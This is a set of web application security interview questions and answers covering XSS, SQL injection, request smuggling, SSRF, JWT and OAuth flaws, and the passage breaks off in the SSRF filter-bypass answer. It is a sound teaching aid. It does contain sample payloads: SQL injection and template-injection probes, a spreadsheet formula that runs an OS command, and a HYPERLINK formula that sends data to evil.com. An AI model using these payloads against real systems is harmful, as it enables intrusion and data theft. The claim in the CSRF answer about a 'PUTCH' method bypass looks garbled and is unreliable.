# 🔐 Web Application Security — Interview Questions & Answers

> **Credit:** [Tib3rius](https://github.com/Tib3rius)  
> A curated collection of web app security interview questions, mostly focused on web app hacking.  
> Most are intentionally difficult — don't worry if you find them challenging!

---

## Table of Contents

1. [Web Cache Deception vs Web Cache Poisoning](#1-web-cache-deception-vs-web-cache-poisoning)
2. [Session Fixation — Two Criteria](#2-session-fixation--two-criteria)
3. [Base64 vs Base64URL Encoding](#3-base64-vs-base64url-encoding)
4. [Types of Cross-Site Scripting (XSS)](#4-types-of-cross-site-scripting-xss)
5. [Boolean Error Inferential (Blind) SQL Injection](#5-boolean-error-inferential-blind-sql-injection)
6. [Same-Origin Policy (SOP)](#6-same-origin-policy-sop)
7. [TE.TE HTTP Request Smuggling](#7-tete-http-request-smuggling)
8. [DOM Clobbering & HTML Sanitizer Bypass](#8-dom-clobbering--html-sanitizer-bypass)
9. [HTTP Parameter Pollution & WAF Bypass](#9-http-parameter-pollution--waf-bypass)
10. [IDOR vs Other Access Control Vulnerabilities](#10-idor-vs-other-access-control-vulnerabilities)
11. [JWKs and JKUs in JWTs](#11-jwks-and-jkus-in-jwts)
12. [Business Logic Vulnerabilities](#12-business-logic-vulnerabilities)
13. [Identifying Server-Side Template Engines](#13-identifying-server-side-template-engines)
14. [Sec-WebSocket-Key Header Purpose](#14-sec-websocket-key-header-purpose)
15. [unsafe-inline in CSP script-src](#15-unsafe-inline-in-csp-script-src)
16. [Stateless Authentication & Its Weakness](#16-stateless-authentication--its-weakness)
17. [CSRF Mitigation Techniques](#17-csrf-mitigation-techniques)
18. [XML Parameter Entities & XXE](#18-xml-parameter-entities--xxe)
19. [Fixing DOM-Based XSS](#19-fixing-dom-based-xss)
20. [Preventing CORS Preflight Requests](#20-preventing-cors-preflight-requests)
21. [Insecure Deserialization Exploitation](#21-insecure-deserialization-exploitation)
22. [File Upload Security Checks](#22-file-upload-security-checks)
23. [Mass Assignment Attack](#23-mass-assignment-attack)
24. [GraphQL Batching & Rate Limit Bypass](#24-graphql-batching--rate-limit-bypass)
25. [Type Juggling & JSON Exploitation](#25-type-juggling--json-exploitation)
26. [Finding Sensitive Data Exposure](#26-finding-sensitive-data-exposure)
27. [Requests Immune to CSRF](#27-requests-immune-to-csrf)
28. [Dangers of OR-True SQL Injection Testing](#28-dangers-of-or-true-sql-injection-testing)
29. [Vulnerabilities Leading to OS Command Execution](#29-vulnerabilities-leading-to-os-command-execution)
30. [Prototype Pollution](#30-prototype-pollution)
31. [Testing Vertical Access Control at Scale](#31-testing-vertical-access-control-at-scale)
32. [Session Storage Preservation](#32-session-storage-preservation)
33. [Finding XXE Beyond XML Forms](#33-finding-xxe-beyond-xml-forms)
34. [Password Reset Flow Vulnerabilities](#34-password-reset-flow-vulnerabilities)
35. [Encoding vs Encryption vs Hashing](#35-encoding-vs-encryption-vs-hashing)
36. [Exploiting HTTP Request Smuggling](#36-exploiting-http-request-smuggling)
37. [Server-Side Request Forgery (SSRF)](#37-server-side-request-forgery-ssrf)
38. [TLS/SSL Misconfigurations](#38-tlsssl-misconfigurations)
39. [Risks of Sensitive Data in URL Query Parameters](#39-risks-of-sensitive-data-in-url-query-parameters)
40. [Open Redirect Exploitation](#40-open-redirect-exploitation)
41. [Output Encoding for XSS Mitigation](#41-output-encoding-for-xss-mitigation)
42. [403 Forbidden Bypass Techniques](#42-403-forbidden-bypass-techniques)
43. [CAPTCHA Weaknesses](#43-captcha-weaknesses)
44. [XSS When Users Can Submit HTML](#44-xss-when-users-can-submit-html)
45. [Pentest Scoping Call Questions](#45-pentest-scoping-call-questions)
46. [Fixing Insecure Deserialization](#46-fixing-insecure-deserialization)
47. [User Account Enumeration Techniques](#47-user-account-enumeration-techniques)
48. [Detecting Blind Command Injection](#48-detecting-blind-command-injection)
49. [Race Condition Vulnerability Types](#49-race-condition-vulnerability-types)
50. [NoSQL Injection vs SQL Injection](#50-nosql-injection-vs-sql-injection)
51. [HTTP Request Syntax](#51-http-request-syntax)
52. [JWT Attack Techniques](#52-jwt-attack-techniques)
53. [Web Cache Poisoning — Process](#53-web-cache-poisoning--process)
54. [Server-Side Template Injection — Process](#54-server-side-template-injection--process)
55. [Formula Injection (CSV Injection)](#55-formula-injection-csv-injection)
56. [OAuth 2.0 Flaws & Misconfigurations](#56-oauth-20-flaws--misconfigurations)
57. [CL.0 HTTP Request Smuggling](#57-cl0-http-request-smuggling)
58. [HTML Injection Exploitation](#58-html-injection-exploitation)
59. [Bypassing SSRF Filters](#59-bypassing-ssrf-filters)
60. [PHP include() — Code Execution](#60-php-include--code-execution)
61. [CRLF Injection](#61-crlf-injection)

---

## 1. Web Cache Deception vs Web Cache Poisoning

**Q:** What is the difference between Web Cache Deception and Web Cache Poisoning?

**A:**

- **Web Cache Deception** involves finding a dynamic page accessible via a URL that a web cache will automatically cache (e.g., if `/transactions` can be accessed at `/transactions.jpg`). An attacker tricks a victim into visiting the cacheable URL, then loads the same URL to retrieve the victim's cached information.

- **Web Cache Poisoning** involves finding an input that causes an exploitable change in the response but doesn't form part of the cache key. When an attacker sends their payload, the exploited response gets cached and delivered to anyone who accesses the page.

---

## 2. Session Fixation — Two Criteria

**Q:** What two criteria must be met to exploit Session Fixation?

**A:**

> Session Fixation is a *type* of Session Hijacking attack, not a synonym.

Two criteria must be met:

1. Attacker must be able to **forcibly set** a syntactically valid but inactive session token in the victim's browser (e.g., via XSS or CRLF injection).
2. Once the victim authenticates, the application **uses the existing session token** instead of issuing a new one.

---

## 3. Base64 vs Base64URL Encoding

**Q:** What are the differences between Base64 and Base64URL encoding?

**A:**

| Feature | Base64 | Base64URL |
|--------|--------|-----------|
| `+` character | ✅ Used | ❌ Replaced with `-` |
| `/` character | ✅ Used | ❌ Replaced with `_` |
| `=` padding | Required | Optional (usually omitted) |

> 💡 **Fun fact:** Padding (`=`) isn't actually required for decoding even in regular Base64.  
> - 2 Base64 chars → 1 remaining byte  
> - 3 Base64 chars → 2 remaining bytes

---

## 4. Types of Cross-Site Scripting (XSS)

**Q:** Name 5 (or more) types of Cross-Site Scripting.

**A:**

The 5 core types:

1. **Reflected XSS** — payload reflected in the immediate response
2. **Stored XSS** — payload persisted and served to other users
3. **DOM-Based XSS** — payload executed via client-side DOM manipulation
4. **CSTI (Client-Side Template Injection)** — exploits client-side template engines
5. **Server-Side XSS** — executed during server-side rendering

Additional types: `Self XSS`, `XST`, `Universal XSS`, `Blind XSS`, `Mutation XSS`

---

## 5. Boolean Error Inferential (Blind) SQL Injection

**Q:** How does Boolean *Error* Inferential (Blind) SQL Injection work?

**A:**

> ⚠️ This is NOT the same as:
> - Standard **Boolean Blind SQLi** (different response for true/false conditions)
> - **Error-Based SQLi** (database error reveals data directly)

In Boolean **Error** Inferential SQLi, injecting `AND 1=1` vs `AND 1=2` returns the **same** response. The trick is to:

1. Purposefully cause a **database error** when a test condition is **true**
2. Hope that error propagates back (e.g., as a `500 Internal Server Error`)

**Common technique — divide by zero using CASE:**

```sql
AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)
```

---

## 6. Same-Origin Policy (SOP)

**Q:** What is the Same-Origin Policy (SOP) and how does it work?

**A:**

The **Same-Origin Policy** is a browser security mechanism that prevents cross-origin data access.

- Client-side code can only **read** data from a URL if it shares the same **origin** as the current app.
- Two URLs share the same origin if they have the same: **protocol + host + port**
- **Reading** vs **embedding** data is treated differently — apps can embed scripts, images, videos across origins, but cannot access their raw bytes.

---

## 7. TE.TE HTTP Request Smuggling

**Q:** How does the TE.TE variant of HTTP Request Smuggling work?

**A:**

In TE.TE, **all servers** prefer `Transfer-Encoding` over `Content-Length` when both are present — normally preventing Request Smuggling.

**The attack:** Manipulate the `Transfer-Encoding` header so that **one server fails to recognize it**, causing it to fall back to `Content-Length` instead.

Common manipulation techniques:
- Whitespace before the colon: `Transfer-Encoding : chunked`
- Capitalization variations: `transfer-encoding: chunked`
- Modified value: `Transfer-Encoding: xchunked`

---

## 8. DOM Clobbering & HTML Sanitizer Bypass

**Q:** What is DOM Clobbering and how can it be used to bypass HTML sanitizers, resulting in XSS?

**A:**

**DOM Clobbering** is a technique to manipulate the DOM using **only HTML elements** (no JavaScript). By using `id` or `name` attributes on certain elements, attackers can create global variables in the DOM — potentially leading to XSS.

Example: An element with `id="x"` can override `window.x`, allowing injection into JavaScript logic that references global variables.

> 🔗 Try the [DOM Clobbering Cheatsheet](https://tib3rius.com/dom/) (best in Chrome)

---

## 9. HTTP Parameter Pollution & WAF Bypass

**Q:** Describe how HTTP Parameter Pollution could be used to bypass a Web Application Firewall.

**A:**

Some servers **concatenate** values when identical parameters appear multiple times (often with a separator like `,`). A WAF may inspect each parameter independently.

**Attack:** Split a malicious payload across multiple identical parameters:

```
?param=PART1&param=PART2
```

The WAF sees two harmless values; the backend reassembles the payload.

---

## 10. IDOR vs Other Access Control Vulnerabilities

**Q:** Describe IDOR and explain how mitigating it differs from other access control vulnerabilities.

**A:**

**IDOR (Insecure Direct Object Reference)** occurs when an app provides access to a resource via a unique reference (e.g., an ID) without checking if the *requesting user* should have access to that *specific resource*.

| | Standard Access Control | IDOR |
|--|--|--|
| User CAN access | The functionality | The functionality |
| User CANNOT access | Certain functionality | Specific resources via that functionality |
| Mitigation | Check if user can use the feature | Check if user can access *this specific* resource |

---

## 11. JWKs and JKUs in JWTs

**Q:** What are JWKs and JKUs and how does their usage differ in JWTs?

**A:**

| Term | Full Name | Description |
|------|-----------|-------------|
| **JWK** | JSON Web Key | A JSON object representing a signing key |
| **JKU** | JSON Web Key Set URL | A URL pointing to a set of JWKs |

Both go in the **JWT header**.

- **JWK** — embeds the **entire public key** directly in the header
- **JKU** — points to a **remote set** of multiple public keys

In both cases, a **`kid` (key ID)** is used to select which key to use.

---

## 12. Business Logic Vulnerabilities

**Q:** What is Business Logic and how does testing for it differ compared to XSS, SQLi, etc.?

**A:**

**Business logic** is code that mimics real-world business operations/decisions, rather than how users technically interact with the app.

**Testing differences:**

| | Technical Vulns (XSS, SQLi) | Business Logic Vulns |
|--|--|--|
| Approach | Technical exploitation of data processing flaws | Identify & challenge developer assumptions |
| Tools | Scanners, fuzzers | Manual, contextual analysis |
| Automatable? | ✅ Yes | ❌ No — requires understanding app purpose |

---

## 13. Identifying Server-Side Template Engines

**Q:** Describe 3 payloads you could use to identify a server-side template engine by causing an error.

**A:**

```
1. Invalid syntax polyglot:   ${{<%[%'"}}%\.
2. Divide by zero:            ${1/0}
3. Invalid variable name:     ${tib3rius}
```

Different template engines will produce different errors, revealing the engine in use.

---

## 14. Sec-WebSocket-Key Header Purpose

**Q:** What is the purpose of the `Sec-WebSocket-Key` header?

**A:**

Despite its name, it has **nothing to do with security or encryption**.

Since WebSockets begin with an HTTP handshake, `Sec-WebSocket-Key` is used to **verify the server supports WebSockets**. If the client doesn't receive a correctly hashed version of the key from the server, the WebSocket connection is not established.

---

## 15. `unsafe-inline` in CSP `script-src`

**Q:** What does the `unsafe-inline` value allow if used in a `script-src` CSP directive?

**A:**

`unsafe-inline` allows:
- ✅ Inline scripts: `<script>...</script>`
- ✅ Event handler attributes: `onclick="..."`, `onload="..."`, etc.

`unsafe-inline` does **NOT** allow:
- ❌ Loading scripts from external files
- ❌ `eval()` and similar string-to-code execution methods

---

## 16. Stateless Authentication & Its Weakness

**Q:** Give an example of stateless authentication and describe an inherent weakness.

**A:**

**Example:** JWT (JSON Web Token) authentication.

**Inherent weakness:** Since all session data is stored **client-side**, the server cannot **forcibly expire** user sessions. If a token is compromised, it remains valid until its natural expiry.

---

## 17. CSRF Mitigation Techniques

**Q:** Describe 3 ways to mitigate Cross-Site Request Forgery 🛡️ .

**A:**

1. **SameSite Cookie Attribute** — Set to `Lax` or `Strict` on session cookies. Prevents cookies from being sent in cross-site requests (some exceptions apply to `Lax`).

2. **Anti-CSRF Tokens** — Require unique, unpredictable tokens submitted with vulnerable requests. Must not be submitted only in cookies.

3. **Referer Header Validation** — Check that the `Referer` header matches a trusted origin before processing the request.

⚠️ **An important point** — some middleware automatically protects CSRF, for example, in Golang fiber HTTP methods such as `POST` , `PUT`, and `DELETE` , If you use `PUTCH` , you can bypass these methods.

---

## 18. XML Parameter Entities & XXE

**Q:** What are XML parameter entities and what limitations do they have in XXE Injection?

**A:**

**XML parameter entities** are referenced with `%` instead of `&`:

```xml
<!ENTITY % myParam "value">
```

**Limitation:** They can only be referenced **within a DTD**, not in the main XML document body. This means parameter entities are typically only useful with **out-of-band XXE** techniques.

---

## 19. Fixing DOM-Based XSS

**Q:** What recommendations would you give for fixing DOM-based XSS?

**A:**

1. **Avoid dangerous sinks** — Don't pass untrusted inputs to dangerous JavaScript functions (e.g., `innerHTML`, `eval`, `document.write`).
2. **Allowlist validation** — Ensure values only contain expected characters (rather than trying to block bad ones).
3. **Encode inputs** — Apply context-appropriate encoding before inserting data into the DOM.

---

## 20. Preventing CORS Preflight Requests

**Q:** What conditions must be met to *prevent* a browser from sending a CORS Preflight request?

**A:**

All of the following must be true:

1. **Method** — Only `GET`, `HEAD`, or `POST`
2. **Headers** — Only: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `Range`
3. **Content-Type** (if set) — Only: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
4. No event listener on `XMLHttpRequest.upload` (if using XHR)
5. No `ReadableStream` object used

---

## 21. Insecure Deserialization Exploitation

**Q:** Describe 3 ways an Insecure Deserialization vulnerability could be exploited.

**A:**

1. **Modify object attribute values** — Change data like roles, balances, or timestamps
2. **Modify object attribute types** — Alter type expectations to bypass validation
3. **Magic Methods + Gadget Chains** — Use special lifecycle methods to trigger calls to other functions, potentially leading to **RCE**

---

## 22. File Upload Security Checks

**Q:** List checks an application might perform to prevent malicious file uploads.

**A:**

1. **Extension & MIME-type allowlisting** — Only allow specific safe file types
2. **File analysis & AV scanning** — Confirm actual file type (not just declared) and scan for malware
3. **Path canonicalization** — Normalize the file path before checking it resolves to an allowed directory (prevents path traversal)

---

## 23. Mass Assignment Attack

**Q:** How does Mass Assignment work and what are potential outcomes?

**A:**

**Mass Assignment** occurs when create/update functionality doesn't restrict which object attributes a user can set. Common in MVC frameworks.

**Potential outcomes:**
- Elevating user role to admin
- Adding funds to an account balance
- Assigning resources to other users
- Log forgery by manipulating date values

---

## 24. GraphQL Batching & Rate Limit Bypass

**Q:** What is GraphQL batching and how can it bypass rate limiting?

**A:**

**GraphQL batching** allows multiple queries/mutations in a **single request**, either using arrays or aliases. All are executed and results returned together.

**Bypass:** Instead of sending 1,000 separate requests (triggering rate limits), send **1 request containing 1,000 queries**.

```graphql
# Array batching
[{ "query": "..." }, { "query": "..." }]

# Alias batching
query { attempt1: login(...) attempt2: login(...) }
```

---

## 25. Type Juggling & JSON Exploitation

**Q:** What is type juggling and why does JSON help exploit it?

**A:**

**Type juggling** occurs in languages (e.g., PHP) where variables are automatically converted between types in certain operations, rather than throwing exceptions.

**Why JSON helps:** JSON natively supports multiple data types — `numbers`, `strings`, `booleans`, `arrays`, `objects`, `null` — while URL/body parameters typically only support strings. This allows attackers to supply typed values (e.g., a boolean `true`) that trigger unexpected type comparisons.

---

## 26. Finding Sensitive Data Exposure

**Q:** Describe 3 techniques to find sensitive data being exposed by an application.

**A:**

1. **Source code analysis** — Review HTML, JS, comments for hardcoded secrets
2. **Directory busting** — Discover unlinked files/directories containing sensitive data
3. **Fuzzing for errors** — Cause exceptions and stack traces that leak implementation details
4. **Access control exploitation** — Access resources beyond your permission level
5. **Google dorking** — Use search operators to find indexed sensitive pages
6. **Git history analysis** — Look for removed credentials in version history
7. **SQL injection** — Extract data directly from the database

---

## 27. Requests Immune to CSRF

**Q:** Describe attributes of a request that make it effectively immune to CSRF.

**A:**

1. **Non-cookie authentication** — Uses `Authorization` header with a non-trivial token (e.g., JWT) or any custom header with an unpredictable value
2. **Non-simple method + restrictive CORS** — Server uses `PUT`/`DELETE` (requiring preflight) AND doesn't support permissive CORS
3. **Content-Type mismatch** — Request requires `application/json` + appropriate header (triggers preflight if CORS is locked down)
4. **Effective anti-CSRF value** — A "secret" embedded in the request that an attacker can't know (e.g., current password in a password-change form)

---

## 28. Dangers of `OR <true>` SQL Injection Testing

**Q:** Name 3 negative outcomes of relying on `OR <true>` for SQL injection testing.

**A:**

1. **Performance issues** — `OR 1=1` returns **all rows** of a table, potentially crashing the server on large datasets
2. **False positives** — For login forms expecting a single user row, `OR 1=1` returns all users, which may trigger a "login successful" response even without valid credentials — masking whether true SQLi exists
3. **Catastrophic data loss** — If injected into an `UPDATE` or `DELETE` statement, `OR 1=1` modifies or deletes **every record** in the table

---

## 29. Vulnerabilities Leading to OS Command Execution

**Q:** Name 5 vulnerabilities that could potentially lead to OS command execution.

**A:**

1. OS Command Injection
2. Insecure Deserialization
3. Server-Side Template Injection (SSTI)
4. File Upload Vulnerabilities
5. File Inclusion Vulnerabilities (LFI/RFI)
6. Server-Side Prototype Pollution
7. Code Injection
8. SQL Injection (e.g., `xp_cmdshell` in MSSQL, `INTO OUTFILE` in MySQL)
9. XXE (via certain server-side processing)

---

## 30. Prototype Pollution

**Q:** What is prototype pollution, and what exploits could it lead to client/server-side?

**A:**

**Prototype Pollution** is a JavaScript vulnerability where attackers add properties to global object prototypes, which propagate to all objects in the application.

| Variant | Exploits |
|---------|---------|
| Client-side JS | DOM-based XSS |
| Server-side (Node.js) | Access control bypasses, potential RCE |

---

## 31. Testing Vertical Access Control at Scale

**Q:** How would you test Vertical Access Control on an app with 20 roles and 300+ requests?

**A:**

Manual testing is possible but impractical. Use **guided automation** via Burp Suite extensions:

- **Auth Analyzer** — Tracks multiple sessions (one per role), replays each request with updated session tokens, and compares responses to the original
- **AuthMatrix** — More complex automation; handles login flows, anti-CSRF token tracking, per-request/role rule configuration, and result persistence for re-validation after fixes

---

## 32. Session Storage Preservation

**Q:** Under what circumstances is a tab's Session Storage instance preserved?

**A:**

Session Storage is preserved when:
- ✅ The page is **reloaded**
- ✅ The user **navigates away and returns** to the same tab
- ✅ The **tab is closed** (if the browser supports tab restoration)
- ✅ The **browser crashes** (allows session resume, unlike clean exit in some browsers)

---

## 33. Finding XXE Beyond XML Forms

**Q:** Other than uploading XML via a form, how else might one find and exploit XXE?

**A:**

Many file formats use XML as a base:
- **SVG** files
- **Microsoft Office documents** (`.docx`, `.xlsx`, `.pptx`)
- **KML** and other XML-based markup languages
- **SOAP** web services
- **APIs** that accept both JSON and XML (try switching `Content-Type` to `application/xml`)

---

## 34. Password Reset Flow Vulnerabilities

**Q:** Name some common password reset flow vulnerabilities.

**A:**

1. Reset based on **user identifier** (username) instead of a secret token
2. **Host Header Injection** to hijack password reset links sent via email
3. **Weak/guessable reset tokens** that don't expire quickly or after use
4. Using **security questions** instead of a secret token
5. **Username enumeration** via different success/failure messages

---

## 35. Encoding vs Encryption vs Hashing

**Q:** What is the difference between encoding, encryption, and hashing?

**A:**

| | Encoding | Encryption | Hashing |
|--|--|--|--|
| **Purpose** | Format conversion | Confidentiality | Integrity verification |
| **Reversible?** | ✅ Always (if algorithm known) | ✅ With correct key | ❌ One-way |
| **Key required?** | ❌ No | ✅ Yes | ❌ No |
| **Example** | Base64, URL encoding | AES, RSA | SHA-256, bcrypt |

---

## 36. Exploiting HTTP Request Smuggling

**Q:** Name some ways an attacker might exploit HTTP Request Smuggling.

**A:**

1. **Force XSS** — Inject payloads from otherwise unexploitable locations (e.g., `User-Agent` header) into another user's response
2. **Session hijacking** — Capture victim requests (including session tokens) via "save" functionality or next-request capture
3. **Access control bypass** — Smuggle a request to a restricted area by piggybacking it on a legitimate request

---

## 37. Server-Side Request Forgery (SSRF)

**Q:** What is SSRF and how can it be detected and exploited?

**A:**

**SSRF** occurs when an attacker can cause a backend server to make requests to unintended targets.

**Detection:** Look for parameters containing URLs, hostnames, or file paths. Attempt to:
- Make the server request a host you control (check for DNS/HTTP callbacks)
- Access internal/backend services

**Exploitation:**
- Read internal files
- Port scan internal network
- Leak request header information
- Execute code (via chained vulnerabilities)
- Deliver XSS payloads

---

## 38. TLS/SSL Misconfigurations

**Q:** Name some ways TLS/SSL can be misconfigured.

**A:**

1. Outdated protocols (SSLv3, TLS 1.0/1.1)
2. Insecure private key sizes
3. Incomplete certificate chains
4. Expired or revoked certificates
5. Insecure cipher suites
6. Lack of forward secrecy
7. Insecure key exchange algorithms
8. Insecure client-initiated renegotiation

---

## 39. Risks of Sensitive Data in URL Query Parameters

**Q:** Why is sending sensitive data in URL query parameters insecure?

**A:**

1. **Server logs** — URLs are logged by web servers and intermediary proxies
2. **Browser history** — Saved locally, accessible on shared/public machines
3. **Visible in screenshots/screenshares** — Easily captured and leaked
4. **Users copy/paste URLs** — May share sensitive links without realizing
5. **Referer header leakage** — If third-party resources are loaded, the URL (with sensitive params) may be sent as a `Referer` header to that third party

---

## 40. Open Redirect Exploitation

**Q:** In what ways could an open redirect be exploited?

**A:**

1. **Phishing** — Redirect victim to a malicious clone of the site (original URL looks legitimate)
2. **SSRF chain** — Bypass URL validation to reach prohibited internal targets
3. **OAuth token theft** — Chain with misconfigured OAuth to steal access tokens via `redirect_uri`
4. **CRLF injection** — If redirect uses `Location` header, inject `\r\n` to add arbitrary headers

---

## 41. Output Encoding for XSS Mitigation

**Q:** Describe two output encoding techniques and their contexts.

**A:**

| Context | Encoding Technique |
|---------|-------------------|
| **HTML body** | Encode: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;` |
| **HTML attributes** | Same as above if values are quoted; otherwise encode ALL non-alphanumeric chars to HTML entities |
| **JavaScript** | Encode all non-alphanumeric characters to Unicode format: `\uXXXX` (e.g., `"` → `\u0022`) |

---

## 42. 403 Forbidden Bypass Techniques

**Q:** Describe three "403 Forbidden" bypass techniques.

**A:**

1. **HTTP method switching** — Try `POST` instead of `GET`, or use method override headers (`X-HTTP-Method-Override`, `X-HTTP-Method`)
2. **IP spoofing headers** — Use `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP` to forge source IP and bypass IP-based blocklists
3. **URL manipulation** — Use path traversal (`/admin/../admin`), case modification, character insertion, or double URL-encoding

---

## 43. CAPTCHA Weaknesses

**Q:** Describe some potential CAPTCHA weaknesses.

**A:**

1. **Replay attacks** — Reuse a previously correct CAPTCHA answer
2. **Improper input validation** — Remove or blank CAPTCHA-related parameters
3. **Leaked answers** — Correct answer visible in source code or CSS (has been seen in the wild!)
4. **Low entropy** — Small set of possible answers makes brute-force viable
5. **ML susceptibility** — With enough training data, OCR/ML can solve the CAPTCHA automatically

---

## 44. XSS When Users Can Submit HTML

**Q:** You find XSS but users should be able to submit HTML. What's your advice?

**A:**

1. **HTML Sanitizer** — Use a library like [DOMPurify](https://github.com/cure53/DOMPurify) with a strict allowlist of safe elements and attributes
2. **Sandbox domain** — Host user HTML on a separate "sandbox" domain in an `<iframe>`. JavaScript runs in the sandbox's security context and cannot affect the main app
3. **Content Security Policy (CSP)** — Add a well-configured CSP as an additional layer to restrict what JavaScript can execute

---

## 45. Pentest Scoping Call Questions

**Q:** What questions would you ask during a web app pentest scoping call?

**A:**

1. How much functionality does the app have? (number of "pages")
2. How complex is the functionality? (learning curve, multi-step flows)
3. How many roles should be tested?
4. Which environment? (dev / staging / prod)
5. Do test accounts have access to dummy data?
6. Any access restrictions? (VPN, IP allowlist)
7. Any custom protocols or proprietary encoding/encryption?
8. Is there rate limiting, a WAF, or IPS in place?
9. Any out-of-scope areas or vulnerabilities not to test? (e.g., DoS)

---

## 46. Fixing Insecure Deserialization

**Q:** How would you recommend fixing an Insecure Deserialization vulnerability?

**A:**

1. **Avoid it entirely** — Don't pass serialized data via user inputs if possible
2. **Use safe formats** — Prefer JSON, Protobuf, or other non-executable serialization formats
3. **Digital signatures** — Sign serialized data and verify the signature *before* deserializing
4. **Type checking** — Perform type checks against deserialized data before using it

---

## 47. User Account Enumeration Techniques

**Q:** Name some user account enumeration techniques.

**A:**

1. **Differential messages** — Different success/error messages on login, registration, or password reset pages
2. **IDOR** — Access user resources by ID without authorization
3. **Timing attacks** — Measure response time differences during login (e.g., password hashing only occurs for valid usernames)
4. **API over-exposure** — Endpoints like `/v1/users` returning full user lists

---

## 48. Detecting Blind Command Injection

**Q:** Name some techniques to detect blind/inferential command injection.

**A:**

1. **Time delays** — Inject `sleep 5` (*nix) or `ping -n 5 127.0.0.1` (Windows) and measure response time
2. **File output to webroot** — Redirect output to a known web-accessible file: `command > /var/www/html/out.txt`
3. **Out-of-band network interaction** — Use `dig`, `host`, `nslookup` (DNS) or `curl`, `wget` (HTTP) to trigger detectable callbacks

---

## 49. Race Condition Vulnerability Types

**Q:** What are some types of race condition vulnerabilities in web apps?

**A:**

1. **Limit overrun** — Perform more actions than allowed (e.g., redeem a gift card multiple times)
2. **State bypass** — Skip a required state transition (e.g., bypass MFA during login)
3. **Resource access conflict** — Access a shared resource during processing (e.g., access a malicious upload before AV scans it)

---

## 50. NoSQL Injection vs SQL Injection

**Q:** How does NoSQL Injection differ from SQL Injection?

**A:**

| | SQL Injection | NoSQL Injection |
|--|--|--|
| Target | SQL databases | NoSQL databases |
| Query language | Standardized SQL | Varies by database (no standard) |
| Operator injection | Less common | ✅ Common — can alter conditional logic |
| JS execution | ❌ Rarely | ✅ Some NoSQL DBs execute arbitrary JavaScript |
| Testing approach | More universal | Highly dependent on DB type and language |

---

## 51. HTTP Request Syntax

**Q:** Describe the syntax of an HTTP request.

**A:**

```
GET /path HTTP/1.1\r\n          ← Request line (method + URI + version)
Host: example.com\r\n           ← Headers (Host is mandatory in HTTP/1.1)
Content-Type: application/json\r\n
\r\n                            ← Empty line separating headers from body
{"key": "value"}                ← Optional body
```

**Structure:**
1. **Request line** — `METHOD URI HTTP/VERSION` separated by spaces, ending with CRLF
2. **Headers** — `Name: Value` pairs, each ending with CRLF
3. **Empty line** — CRLF to signal end of headers
4. **Body** — Optional; format/length determined by headers

---

## 52. JWT Attack Techniques

**Q:** Name some potential attacks against JWTs.

**A:**

1. **No signature verification** — Server accepts unsigned tokens
2. **`"none"` algorithm** — Set `alg: none` to bypass signature verification
3. **Embedded signing key (JWK injection)** — Embed attacker's public key in the JWT header
4. **Remote signing key (JKU injection)** — Point `jku` to attacker-controlled key server
5. **Brute-force weak secrets** — Crack HMAC keys (e.g., using `hashcat`)
6. **Algorithm confusion** — Switch from RS256 to HS256 using the public key as the HMAC secret

---

## 53. Web Cache Poisoning — Process

**Q:** Describe the process of finding and exploiting a web cache poisoning issue.

**A:**

1. **Identify unkeyed inputs** — Use tools like [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to find headers/cookies not included in the cache key
2. **Test for client-side vulnerabilities** — Check if unkeyed inputs can trigger XSS, open redirect, etc.
3. **Cache the payload** — Send the malicious request multiple times until it gets cached
4. **Verify** — Send the same request *without* the unkeyed input and confirm the cached payload is returned

---

## 54. Server-Side Template Injection — Process

**Q:** Describe the process of finding and exploiting SSTI.

**A:**

1. **Identify injection points** — Find reflected or stored inputs that may end up in templates
2. **Probe with polyglot** — Send `${{<%[%'"}}%\` to trigger template errors
3. **Identify the engine** — Use arithmetic payloads:
   - `${7*7}` → Freemarker / Smarty
   - `{{7*7}}` → Jinja2 / Twig
   - `<%=7*7%>` → ERB (Ruby)
4. **Exploit** — Research known exploit chains for that engine (file read/write, OS command execution)

---

## 55. Formula Injection (CSV Injection)

**Q:** What is formula injection and how might it be exploited?

**A:**

**Formula Injection** (CSV Injection) occurs when an attacker can insert Excel-like formulas (e.g., `=1+1`) into CSV exports. When a victim opens the file in a spreadsheet app, the formula executes.

**Exploitation examples:**

```
=cmd|'/C notepad'!A1          ← Execute OS command (Windows)
=HYPERLINK("http://evil.com/?"&A1,"Click me")  ← Data exfiltration
```

**Limitations:** Multiple warning popups appear; user must actively enable macros.

**Server-side variant:** If the server processes Excel files (e.g., Google Sheets, backend Excel parsing), these limitations may not apply and the impact is more severe.

---

## 56. OAuth 2.0 Flaws & Misconfigurations

**Q:** Name some common OAuth 2.0 flaws and misconfigurations.

**A:**

1. **Implicit grant type** — Insecure implementation exposing tokens in URL fragments
2. **CSRF via `state` parameter** — Missing, predictable, or unvalidated `state` parameter
3. **`redirect_uri` hijacking** — Weak validation allowing redirection to attacker-controlled URLs
4. **Improper scope validation** — Application grants more permissions than requested/needed

---

## 57. CL.0 HTTP Request Smuggling

**Q:** Describe CL.0 and how it differs from standard variants like CL.TE.

**A:**

**CL.0** occurs when a **back-end server ignores** the `Content-Length` header in certain scenarios, while the front-end server uses it. This allows a second request to be smuggled in the body of the first.

| Variant | Front-end uses | Back-end uses |
|---------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| **CL.0** | **Content-Length** | **Neither (ignores CL)** |

The `Transfer-Encoding` header is **never used** in CL.0 — hence the name.

---

## 58. HTML Injection Exploitation

**Q:** Name some potential ways to exploit HTML Injection (excluding XSS).

**A:**

1. **Social engineering** — Inject links or redirects to mislead users
2. **Layout denial of service** — Break page rendering with malformed HTML
3. **SSRF/LFI via PDF generation** — If the server generates PDFs from HTML, inject server-side resource references
4. **Password stealing** — Inject forms/elements that capture credentials ([research example](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp))
5. **Dangling markup injection** — Exfiltrate sensitive page data via incomplete tags
6. **XSS via DOM Clobbering** — Use HTML elements to create malicious global variables

---

## 59. Bypassing SSRF Filters

**Q:** Describe some methods for bypassing SSRF detection filters.

**A:**

1. **Alternative IP representations** — Decimal (`2130706433`), hex (`0x7f000001`), or octal (`0177.0.0.1`) for `127.0.0.1`
2. **DNS resolution** — Register a domain that resolves to an internal IP
